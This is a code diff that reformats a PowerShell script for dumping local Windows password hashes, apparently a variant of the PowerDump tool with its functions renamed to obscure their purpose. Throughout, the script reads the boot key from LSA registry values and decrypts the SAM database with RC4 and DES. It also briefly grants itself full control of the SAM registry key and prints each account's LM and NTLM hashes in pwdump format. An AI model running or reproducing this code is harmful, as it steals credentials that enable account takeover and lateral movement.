@@ -1,93 +1,20 @@
-function DumpSAM { 
-
-[CmdletBinding()]
-Param (
-    [Switch]$PSObjectFormat
-)
+function DumpSAM {
+    [CmdletBinding()]
+    Param ([Switch]$PSObjectFormat)
 
 $script:PowerDump = $null
-function narrows
-{
-    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
-    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
-    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')
-    $PInvokeMethod = $TypeBuilder.DefineMethod(
-        'RegOpenKeyEx',
-        [Reflection.MethodAttributes] 'Public, Static',
-        [int],
-        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
-    )
-
-    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-    $FieldArray = [Reflection.FieldInfo[]] @(
-        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
-        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
-    )
-    $FieldValueArray = [Object[]] @(
-        'RegOpenKeyEx',
-        [Runtime.InteropServices.CharSet]::Auto
-    )
-
-    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
-        $DllImportConstructor,
-        @('advapi32.dll'),
-        $FieldArray,
-        $FieldValueArray
-    )
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    $PInvokeMethod = $TypeBuilder.DefineMethod(
-        'RegQueryInfoKey',
-        [Reflection.MethodAttributes] 'Public, Static',
-        [int],
-        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
-    )
-
-    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-
-    $FieldArray = [Reflection.FieldInfo[]] @(
-        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
-        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
-        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
-    )
-    $FieldValueArray = [Object[]] @(
-        'RegQueryInfoKey',
-        [Runtime.InteropServices.CallingConvention]::Winapi,
-        $true
-    )
-
-    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
-        $DllImportConstructor,
-        @('advapi32.dll'),
-        $FieldArray,
-        $FieldValueArray
-    )
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    $PInvokeMethod = $TypeBuilder.DefineMethod(
-        'RegCloseKey',
-        [Reflection.MethodAttributes] 'Public, Static',
-        [int],
-        [Type[]] @( [int])
-    )
-
-    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-    $FieldArray = [Reflection.FieldInfo[]] @(
-        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
-        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
-    )
-    $FieldValueArray = [Object[]] @(
-        'RegCloseKey',
-        $true
-    )
-
-    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
-        $DllImportConstructor,
-        @('advapi32.dll'),
-        $FieldArray,
-        $FieldValueArray
-    )
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    $script:PowerDump = $TypeBuilder.CreateType()
+function narrows {
+        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
+        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
+        $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')
+        $PInvokeMethod = $TypeBuilder.DefineMethod('RegOpenKeyEx', [Reflection.MethodAttributes]'Public, Static', [int], [Type[]]@([int], [string], [int], [int], [int].MakeByRefType()))
+        $PInvokeMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('advapi32.dll'), @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')), @('RegOpenKeyEx', [Runtime.InteropServices.CharSet]::Auto))))
+        $PInvokeMethod = $TypeBuilder.DefineMethod('RegQueryInfoKey', [Reflection.MethodAttributes]'Public, Static', [int], [Type[]]@([int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr]))
+        $PInvokeMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('advapi32.dll'), @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')), @('RegQueryInfoKey', [Runtime.InteropServices.CallingConvention]::Winapi, $true))))
+        $PInvokeMethod = $TypeBuilder.DefineMethod('RegCloseKey', [Reflection.MethodAttributes]'Public, Static', [int], [Type[]]@([int]))
+        $PInvokeMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('advapi32.dll'), @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')), @('RegCloseKey', $true))))
+        $script:PowerDump = $TypeBuilder.CreateType()
 }
 
 $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
@@ -116,273 +43,259 @@ $odd_parity = @(
 function Heretic($sid)
 {
     $c0 = $sid -band 255
-    $c1 = ($sid -band 65280)/256
-    $c2 = ($sid -band 16711680)/65536
-    $c3 = ($sid -band 4278190080)/16777216
-
-    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
-    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 
-
+    $c1 = ($sid -band 65280) / 256
+    $c2 = ($sid -band 16711680) / 65536
+    $c3 = ($sid -band 4278190080) / 16777216
+    $s1 = $c0, $c1, $c2, $c3, $c0, $c1, $c2
+    $s2 = $c3, $c0, $c1, $c2, $c3, $c0, $c1
     return ,((HighGround $s1),(HighGround $s2))
 }
+
 
 function HighGround($s)
 {
     $k0 = [int][math]::Floor($s[0] * 0.5)
-    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
-    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
-    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
-    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
-    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
-    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
-    $k7 = $($s[6] -band 0x7F)
-    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7) 
+    $k1 = ($s[0] -band 0x01) * 64 -bor [int][math]::Floor($s[1] * 0.25)
+    $k2 = ($s[1] -band 0x03) * 32 -bor [int][math]::Floor($s[2] * 0.125)
+    $k3 = ($s[2] -band 0x07) * 16 -bor [int][math]::Floor($s[3] * 0.0625)
+    $k4 = ($s[3] -band 0x0F) * 8 -bor [int][math]::Floor($s[4] * 0.03125)
+    $k5 = ($s[4] -band 0x1F) * 4 -bor [int][math]::Floor($s[5] * 0.015625)
+    $k6 = ($s[5] -band 0x3F) * 2 -bor [int][math]::Floor($s[6] * 0.0078125)
+    $k7 = $s[6] -band 0x7F
+    $key = $k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7
     0..7 | %{
         $key[$_] = $odd_parity[($key[$_] * 2)]
-    }
-
-    return ,$key
-}
+    }return ,$key}
 
 function Ghost([byte[]]$key)
 {
-    return new-object Object |
-    Add-Member NoteProperty key $key -PassThru |
-    Add-Member NoteProperty S $null -PassThru |
-    Add-Member ScriptMethod init {
-        if (-not $this.S)
-        {
-            [byte[]]$this.S = 0..255;
-            0..255 | % -begin{[long]$j=0;}{
-                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
-                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
+    return New-Object PSObject |
+        Add-Member NoteProperty key $key -PassThru |
+        Add-Member NoteProperty S $null -PassThru |
+        Add-Member ScriptMethod init {
+            if (-not $this.S)
+            {
+                $this.S = 0..255
+                $j = 0L
+                0..255 | ForEach-Object -Begin { $j = 0L } -Process {
+                    $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length
+                    $temp = $this.S[$_]
+                    $this.S[$_] = $this.S[$j]
+                    $this.S[$j] = $temp
                 }
-        }
-    } -PassThru |
-    Add-Member ScriptMethod "encrypt" {
-        $data = $args[0];
-        $this.init();
-        $outbuf = new-object byte[] $($data.Length);
-        $S2 = $this.S[0..$this.S.Length];
-        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
-            $i = ($i+1) % $S2.Length;
-            $j = ($j + $S2[$i]) % $S2.Length;
-            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
-            $a = $data[$_];
-            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
-            $outbuf[$_] = ($a -bxor $b);
-        }
-        return ,$outbuf;
-    } -PassThru
+            }
+        } -PassThru |
+        Add-Member ScriptMethod "encrypt" {
+            $data = $args[0]
+            $this.init()
+            $outbuf = New-Object byte[] $data.Length
+            $S2 = $this.S[0..($this.S.Length - 1)]
+            0..($data.Length - 1) | ForEach-Object -Begin { $i = 0; $j = 0 } -Process {
+                $i = ($i + 1) % $S2.Length
+                $j = ($j + $S2[$i]) % $S2.Length
+                $temp = $S2[$i]
+                $S2[$i] = $S2[$j]
+                $S2[$j] = $temp
+                $a = $data[$_]
+                $b = $S2[($S2[$i] + $S2[$j]) % $S2.Length]
+                $outbuf[$_] = $a -bxor $b
+            }
+            return ,$outbuf
+        } -PassThru
 }
 
-function NamFunc1([byte[]]$data, [byte[]]$key)
-{
-    return ,(NamFunc3 $data $key $true)
+function NamFunc1([byte[]]$data, [byte[]]$key){return ,(NamFunc3 $data $key $true)}
+function NamFunc2([byte[]]$data, [byte[]]$key){return ,(NamFunc3 $data $key $false)}
+function NamFunc3([byte[]]$data, [byte[]]$key, $doEncrypt) {
+    $des = New-Object Security.Cryptography.DESCryptoServiceProvider
+    $des.Mode = [Security.Cryptography.CipherMode]::ECB
+    $des.Padding = [Security.Cryptography.PaddingMode]::None
+    $des.Key = $key
+    $des.IV = $key
+    $transform = if ($doEncrypt) { $des.CreateEncryptor() } else { $des.CreateDecryptor() }
+    $result = $transform.TransformFinalBlock($data, 0, $data.Length)
+    return ,$result
 }
 
-function NamFunc2([byte[]]$data, [byte[]]$key)
-{
-    return ,(NamFunc3 $data $key $false)
-}
-
-function NamFunc3([byte[]]$data, [byte[]]$key, $doEncrypt)
-{
-    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
-    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
-    $des.Padding = [Security.Cryptography.PaddingMode]::None;
-    $des.Key = $key;
-    $des.IV = $key;
-    $transform = $null;
-    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
-    else{$transform = $des.CreateDecryptor();}
-    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
-    return ,$result;
-}
-
-function NamFunc4([string]$key, [string]$subkey)
-{
-    switch ($Key) {
-        "HKCR" { $nKey = 0x80000000} #HK Classes Root
-        "HKCU" { $nKey = 0x80000001} #HK Current User
-        "HKLM" { $nKey = 0x80000002} #HK Local Machine
-        "HKU"  { $nKey = 0x80000003} #HK Users
-        "HKCC" { $nKey = 0x80000005} #HK Current Config
+function NamFunc4([string]$key, [string]$subkey) {
+    $nKey = switch ($key) {
+        "HKCR" {0x80000000}
+        "HKCU" {0x80000001}
+        "HKLM" {0x80000002}
+        "HKU"  {0x80000003}
+        "HKCC" {0x80000005}
         default {
-            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
+            throw "Invalid Key. Use one of the following options: HKCR, HKCU, HKLM, HKU, HKCC"
         }
     }
-    $KEYQUERYVALUE = 0x1;
-    $KEYREAD = 0x19;
-    $KEYALLACCESS = 0x3F;
-    $result = "";
-    [int]$hkey=0
-    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
-    {
-    	$classVal = New-Object Text.Stringbuilder 1024
-    	[int]$len = 1024
-    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
-    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
-    	{
-    		$result = $classVal.ToString()
-    	}
-    	else
-    	{
-    		Write-Error "RegQueryInfoKey failed";
-    	}
-    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
-    }
-    else
-    {
-    	Write-Error "Cannot open key";
-    }
-    return $result;
-}
-function SuperKey
-{
-    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{NamFunc4 "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
-    $b = new-object byte[] $($s.Length/2);
-    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
-    $b2 = new-object byte[] 16;
-    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
-    return ,$b2;
-}
-function SuperKeyH
-{
-    param([byte[]]$bootkey);
-    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
-    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
-    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
-    if (-not $k) {return $null}
-    [byte[]]$F = $k.GetValue("F");
-    if (-not $F) {return $null}
-    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
-    $rc4 = Ghost $rc4key;
-    return ,($rc4.encrypt($F[0x80..0x9F]));
-}
-function UserGet([byte[]]$V)
-{
-    if (-not $V) {return $null};
-    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
-    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
-    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
-}
-function SimpleBytes($u, [byte[]]$hbootkey)
-{
-    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
     
-    $LM_exists = $false;
-    $NT_exists = $false;
-    if ($u.V[0xa0..0xa3] -eq 20)
-    {
-        $LM_exists = $true;
-    }
-    elseif ($u.V[0xac..0xaf] -eq 20)
-    {
-        $NT_exists = $true;
-    }
+    $KEYQUERYVALUE = 0x1
+    $KEYREAD = 0x19
+    $KEYALLACCESS = 0x3F
+    $result = ""
+    [int]$hkey = 0
 
-    if ($LM_exists -eq $true)
-    {
-        $lm_hash_offset = $u.HashOffset + 4;
-        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
-        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
-        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
+    if (-not $script:PowerDump::RegOpenKeyEx($nkey, $subkey, 0, $KEYREAD, [ref]$hkey)) {
+        $classVal = New-Object Text.StringBuilder 1024
+        [int]$len = 1024
+        
+        if (-not $script:PowerDump::RegQueryInfoKey($hkey, $classVal, [ref]$len, 0, [ref]$null, [ref]$null,
+            [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, 0)) {
+            $result = $classVal.ToString()
+        } else {
+            Write-Error "RegQueryInfoKey failed"
+        }
+        
+        $script:PowerDump::RegCloseKey($hkey) | Out-Null
+    } else {
+        Write-Error "Cannot open key"
     }
-	
-    elseif ($NT_exists -eq $true)
-    {
-        $nt_hash_offset = $u.HashOffset + 8;
-        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
-    }
-    return ,(Moilanto $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+    
+    return $result
 }
 
-function Moilanto($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
-{
-    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
-    if ($enc_lm_hash)
-    {
-        $lmhash = Rifle2 $rid $hbootkey $enc_lm_hash $almpassword;
+function SuperKey {
+    $s = [string]::Join("", $("JD", "Skew1", "GBG", "Data" | ForEach-Object { NamFunc4 "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_" }))
+    $b = new-object byte[] ($s.Length / 2)
+    0..($b.Length - 1) | ForEach-Object {
+        $b[$_] = [Convert]::ToByte($s.Substring($_ * 2, 2), 16)
+    }
+    $b2 = new-object byte[] 16
+    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | ForEach-Object -Begin { $i = 0 } {
+        $b2[$i] = $b[$_]
+        $i++
+    }
+    
+    return ,$b2
+}
+
+function SuperKeyH {
+    param([byte[]]$bootkey)
+    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
+    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
+    $k = Get-Item HKLM:\SAM\SAM\Domains\Account
+    if (-not $k) { return $null }
+    [byte[]]$F = $k.GetValue("F")
+    if (-not $F) { return $null }
+    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum)
+    $rc4 = Ghost $rc4key
+    return ,($rc4.encrypt($F[0x80..0x9F]))
+}
+
+function UserGet([byte[]]$V) {
+    if (-not $V) { return $null }
+    $offset = [BitConverter]::ToInt32($V[0x0C..0x0F], 0) + 0xCC
+    $len = [BitConverter]::ToInt32($V[0x10..0x13], 0)
+    return [Text.Encoding]::Unicode.GetString($V, $offset, $len)
+}
+
+function SimpleBytes($u, [byte[]]$hbootkey) {
+    [byte[]]$enc_lm_hash = $null
+    [byte[]]$enc_nt_hash = $null
+    
+    $LM_exists = $false
+    $NT_exists = $false
+    
+    if ($u.V[0xA0..0xA3] -eq 20) {
+        $LM_exists = $true
+    }
+    elseif ($u.V[0xAC..0xAF] -eq 20) {
+        $NT_exists = $true
     }
 
-    # NT Hash
-    if ($enc_nt_hash)
-    {
-        $nthash = Rifle2 $rid $hbootkey $enc_nt_hash $antpassword;
+    if ($LM_exists) {
+        $lm_hash_offset = $u.HashOffset + 4
+        $nt_hash_offset = $u.HashOffset + 8 + 0x10
+        $enc_lm_hash = $u.V[$lm_hash_offset..($lm_hash_offset + 0x0F)]
+        $enc_nt_hash = $u.V[$nt_hash_offset..($nt_hash_offset + 0x0F)]
     }
+    elseif ($NT_exists) {
+        $nt_hash_offset = $u.HashOffset + 8
+        $enc_nt_hash = $u.V[$nt_hash_offset..($nt_hash_offset + 0x0F)]
+    }
+    
+    return ,(Moilanto $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey)
+}
 
-    return ,($lmhash,$nthash)
+
+function Moilanto($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) {
+    [byte[]]$lmhash = $empty_lm
+    [byte[]]$nthash = $empty_nt
+    if ($enc_lm_hash) {$lmhash = Rifle2 $rid $hbootkey $enc_lm_hash $almpassword}
+    if ($enc_nt_hash) {$nthash = Rifle2 $rid $hbootkey $enc_nt_hash $antpassword}
+    return ,($lmhash, $nthash)
 }
-function Rifle2($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
-{
-    $deskeys = Heretic $rid;
-    $md5 = [Security.Cryptography.MD5]::Create();
-    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
-    $rc4 = Ghost $rc4_key;
-    $obfkey = $rc4.encrypt($enc_hash);
-    $hash = (NamFunc2  $obfkey[0..7] $deskeys[0]) +
-        (NamFunc2 $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
-    return ,$hash;
+
+function Rifle2($rid, [byte[]]$hbootkey, [byte[]]$enc_hash, [byte[]]$lmntstr) {
+    $deskeys = Heretic $rid
+    $md5 = [Security.Cryptography.MD5]::Create()
+    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
+    $rc4 = Ghost $rc4_key
+    $obfkey = $rc4.encrypt($enc_hash)
+    $hash = (NamFunc2 $obfkey[0..7] $deskeys[0]) + (NamFunc2 $obfkey[8..($obfkey.Length - 1)] $deskeys[1])
+    return ,$hash
 }
-function GetDemLoot
-{
+function GetDemLoot {
     ls HKLM:\SAM\SAM\Domains\Account\Users |
-        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
+        where { $_.PSChildName -match "^[0-9A-Fa-f]{8}$" } |
             Add-Member AliasProperty KeyName PSChildName -PassThru |
-            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
-            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
-            Add-Member ScriptProperty UserName {UserGet($this.GetValue("V"))} -PassThru |
-            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
+            Add-Member ScriptProperty Rid { [Convert]::ToInt32($this.PSChildName, 16) } -PassThru |
+            Add-Member ScriptProperty V { [byte[]]($this.GetValue("V")) } -PassThru |
+            Add-Member ScriptProperty UserName { UserGet($this.GetValue("V")) } -PassThru |
+            Add-Member ScriptProperty HashOffset { [BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f], 0) + 0xCC } -PassThru
 }
-function GetThings
-{
+
+function GetThings {
     Narrows
-    $bootkey = SuperKey;
-    $hbootKey = SuperKeyH $bootkey;
-    GetDemLoot | %{
-        $hashes = SimpleBytes $_ $hBootKey;
-        if($PSObjectFormat)
-        {
+    $bootkey = SuperKey
+    $hbootKey = SuperKeyH $bootkey
+    GetDemLoot | ForEach-Object {
+        $hashes = SimpleBytes $_ $hBootKey
+        if ($PSObjectFormat) {
             $creds = New-Object psobject
             $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
             $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
-            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
-            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
+            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-", "").ToLower()
+            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-", "").ToLower()
             $creds
-        }
-        else
-        {
-            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
-            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
-            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
+        } else {
+            "{0}:{1}:{2}:{3}:::" -f (
+                $_.UserName,
+                $_.Rid,
+                [BitConverter]::ToString($hashes[0]).Replace("-", "").ToLower(),
+                [BitConverter]::ToString($hashes[1]).Replace("-", "").ToLower()
+            )
         }
     }
 }
+
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
     {
-        Write-Warning "Script requires elevated or administrative privileges."
+        Write-Output "Elevated or administrative privileges not present"
         Return
     } 
     else
     {
-        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
-        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
-        "FullControl",
-        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
-        [System.Security.AccessControl.PropagationFlags]"None",
-        [System.Security.AccessControl.AccessControlType]"Allow")
-        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
-        "SAM\SAM\Domains",
-        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
-        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
-        $acl = $key.GetAccessControl()
-        $acl.SetAccessRule($rule)
-        $key.SetAccessControl($acl)
-        GetThings
-        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
-        Set-Acl HKLM:\SAM\SAM\Domains $acl
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+    "FullControl",
+    [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+    [System.Security.AccessControl.PropagationFlags]"None",
+    [System.Security.AccessControl.AccessControlType]"Allow"
+)
+$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+    "SAM\SAM\Domains",
+    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+    [System.Security.AccessControl.RegistryRights]::ChangePermissions
+)
+$acl = $key.GetAccessControl()
+$acl.SetAccessRule($rule)
+$key.SetAccessControl($acl)
+GetThings
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$acl.Access | Where-Object {$_.IdentityReference.Value -eq $user} | ForEach-Object {$acl.RemoveAccessRule($_)} | Out-Null
+Set-Acl HKLM:\SAM\SAM\Domains $acl
+
     }
 }
 
